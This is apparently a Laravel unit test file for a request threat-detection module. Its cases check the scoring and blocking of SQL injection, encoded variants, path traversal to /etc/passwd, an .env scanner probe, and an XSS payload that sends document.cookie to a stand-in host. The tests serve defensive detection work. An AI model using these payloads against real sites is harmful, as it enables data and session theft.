<?php

namespace Tests\Unit;

use App\Security\Detection\DetectionReport;
use App\Security\Detection\PayloadNormalizer;
use App\Security\Detection\RequestInspector;
use App\Security\Detection\SignatureSet;
use App\Security\Detection\ThreatScorer;
use Illuminate\Http\Request;
use Tests\TestCase;

class SecurityDetectionTest extends TestCase
{
    private function makeJsonRequest(array $payload, string $path = 'api/products'): Request
    {
        return Request::create(
            $path,
            'POST',
            [], [], [],
            ['CONTENT_TYPE' => 'application/json', 'HTTP_HOST' => 'localhost', 'REMOTE_ADDR' => '203.0.113.10'],
            json_encode($payload, JSON_THROW_ON_ERROR)
        );
    }

    private function inspect(array $payload, string $path = 'api/products'): DetectionReport
    {
        $request = $this->makeJsonRequest($payload, $path);

        return $this->app->make(ThreatScorer::class)->score(
            $this->app->make(RequestInspector::class)->inspect($request),
            $request
        );
    }

    public function test_signature_set_is_loaded_and_categorised(): void
    {
        $set = $this->app->make(SignatureSet::class);
        $categories = array_unique(array_column($set->all(), 'category'));

        $this->assertGreaterThanOrEqual(8, $set->count());
        foreach (['sqli', 'xss', 'traversal', 'cmdi', 'upload', 'ssrf', 'scanner'] as $expected) {
            $this->assertContains($expected, $categories);
        }
    }

    public function test_sql_injection_is_detected_and_escalated(): void
    {
        $report = $this->inspect(['q' => "' UNION SELECT password FROM users --"]);

        $this->assertContains('sqli', $report->categoryList());
        $this->assertGreaterThanOrEqual(70, $report->score);
        $this->assertContains($report->severity, ['high', 'critical']);
        $this->assertSame('block', $report->action);
    }

    public function test_stored_xss_payload_is_detected(): void
    {
        $report = $this->inspect(['review' => '<p>Hi</p><script>fetch("//evil.example?c="+document.cookie)</script>']);

        $this->assertContains('xss', $report->categoryList());
        $this->assertGreaterThanOrEqual(45, $report->score);
    }

    public function test_path_traversal_is_detected(): void
    {
        $report = $this->inspect(['template' => '../../../../etc/passwd']);

        $this->assertContains('traversal', $report->categoryList());
        $this->assertGreaterThanOrEqual(60, $report->score);
    }

    public function test_double_url_encoded_payload_is_deobfuscated(): void
    {
        $normalizer = new PayloadNormalizer();
        $this->assertStringContainsString(
            'union select',
            strtolower($normalizer->normalize('%2527%2520UNION%2520SELECT%2520password%2520FROM%2520users'))
        );

        $report = $this->inspect(['q' => '%2527%2520UNION%2520SELECT%2520password%2520FROM%2520users']);
        $this->assertContains('sqli', $report->categoryList());
    }

    public function test_html_entity_encoded_xss_is_deobfuscated(): void
    {
        $report = $this->inspect(['comment' => '&lt;script&gt;alert(1)&lt;/script&gt;']);

        $this->assertContains('xss', $report->categoryList());
    }

    public function test_sensitive_routes_receive_a_score_bonus(): void
    {
        $plain = $this->inspect(['q' => '1 OR 1=1'], 'api/products');
        $sensitive = $this->inspect(['q' => '1 OR 1=1'], 'api/auth/login');

        $this->assertGreaterThan($plain->score, $sensitive->score);
    }

    public function test_benign_traffic_does_not_trigger_enforcement(): void
    {
        $report = $this->inspect([
            'name'        => 'Jane Doe',
            'email'       => 'jane@example.com',
            'description' => 'A perfectly ordinary product description.',
            'page'        => 2,
        ]);

        $this->assertSame('allow', $report->action);
        $this->assertLessThan(15, $report->score);
    }

    public function test_observe_mode_never_blocks(): void
    {
        config()->set('security.mode', 'observe');

        $report = $this->inspect(['q' => "' UNION SELECT password FROM users --"]);

        $this->assertContains($report->action, ['log', 'allow']);
        $this->assertNotSame('block', $report->action);
    }

    public function test_disabled_categories_are_not_matched(): void
    {
        config()->set('security.detection.disabled_categories', ['sqli']);
        $this->app->forgetInstance(SignatureSet::class);
        $this->app->forgetInstance(RequestInspector::class);

        $report = $this->inspect(['q' => "' UNION SELECT password FROM users --"]);

        $this->assertNotContains('sqli', $report->categoryList());
    }

    public function test_scanner_probe_path_is_escalated(): void
    {
        $request = Request::create(
            'api/.env',
            'GET',
            [], [], [],
            ['HTTP_HOST' => 'localhost', 'REMOTE_ADDR' => '203.0.113.10']
        );

        $report = $this->app->make(ThreatScorer::class)->score(
            $this->app->make(RequestInspector::class)->inspect($request),
            $request
        );

        $this->assertContains('scanner', $report->categoryList());
        $this->assertGreaterThanOrEqual(45, $report->score);
    }
}
